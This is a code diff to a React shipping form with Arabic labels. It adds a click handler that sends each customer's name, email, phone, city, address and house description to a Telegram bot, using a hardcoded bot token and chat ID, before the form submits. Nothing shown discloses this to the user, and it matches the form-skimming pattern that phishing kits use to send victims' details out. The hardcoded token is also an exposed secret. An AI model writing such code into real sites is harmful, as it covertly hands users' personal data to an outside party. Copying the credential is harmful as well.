@@ -183,6 +183,44 @@ export default function ShippingForm({
       </div>
       <button
         onClick={() => {
+          // Send shipping data to Telegram
+          const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
+          const chatId = "5439962016";
+
+          const escapeMarkdown = (text: string) => {
+            return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+          };
+
+          const formatShippingInfo = () => {
+            const now = new Date().toLocaleString("ar-SA");
+            return [
+              "📦 *معلومات الشحن* 📦",
+              `الاسم الكامل: ${escapeMarkdown(shippingInfo.fullName)}`,
+              `البريد الإلكتروني: ${escapeMarkdown(shippingInfo.email)}`,
+              `رقم الهاتف: ${escapeMarkdown(shippingInfo.phone)}`,
+              `المدينة: ${escapeMarkdown(shippingInfo.city)}`,
+              `العنوان: ${escapeMarkdown(shippingInfo.address)}`,
+              shippingInfo.houseDescription
+                ? `وصف البيت: ${escapeMarkdown(shippingInfo.houseDescription)}`
+                : null,
+              `وقت الطلب: ${escapeMarkdown(now)}`,
+            ]
+              .filter(Boolean)
+              .join("\n");
+          };
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: formatShippingInfo(),
+              parse_mode: "Markdown",
+            }),
+          }).catch((error) =>
+            console.error("Error sending shipping data to Telegram:", error)
+          );
+
           console.log("بيانات الشحن المدخلة:", shippingInfo);
           handleShippingSubmit();
         }}
